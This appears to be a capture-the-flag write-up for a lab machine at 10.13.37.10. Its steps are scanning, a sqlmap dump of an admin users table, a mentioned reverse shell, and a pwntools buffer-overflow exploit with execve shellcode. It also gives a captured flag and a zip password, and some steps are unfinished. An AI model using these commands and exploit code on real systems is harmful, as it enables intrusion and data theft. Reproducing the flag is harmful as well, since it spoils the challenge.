1) PortScan
```bash
rustscan -a 10.13.37.10 --ulimit 5000 -- -sV -sC -Pn
```
![[Pasted image 20230913115945.png]]
2) Digging the domain
```bash
dnsrecon -r 10.13.37.10/24 -n 10.13.37.10
```
![[Pasted image 20230913120254.png]]
3) Analyze the web traffic to find the hidden folder
![[Pasted image 20230913120456.png]]
4) Use sqlmap to retrieve the admin hash
```bash
sqlmap -u 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php' --batch --forms --level 3 --risk 3 -D jetadmin -T users --dump
```
![[Pasted image 20230913120601.png]]
5) Crack the hash on crack station and login
![[Pasted image 20230913120633.png]]
6) Analyze the email.php traffic and change the request to open a reverse shell
![[Pasted image 20230913121242.png]]
![[Pasted image 20230913121421.png]]
7) Get a reverse shell and look on /home/leak. Download it locally and exploit
```python3
#!/usr/bin/python3
from pwn import *

shell = remote('10.13.37.10', 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

leaking = int(shell.recvuntil(b"\n"),16)

payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"*(72-len(payload))
payload += p64(leaking)

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
shell.interactive()
```
8) Expose the binary using socat and launch the exploit
```bash
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &amp;
```
![[Pasted image 20230913143408.png]]
9) Xor non fatto
```
Hello mate!  
First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!  
Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.  
Make sure those binaries are kept safe!  
To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.  
The ports are 5555 and 7777.  
Have fun and keep it safe!  
JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}  
Cheers - Alex
```
10) Elasticity is broken
11) Unzip "Exploitme.zip" with the same key used fo xor crypted message (securewebincrocks)
![[Pasted image 20230914104419.png]]
12) Exploit the 
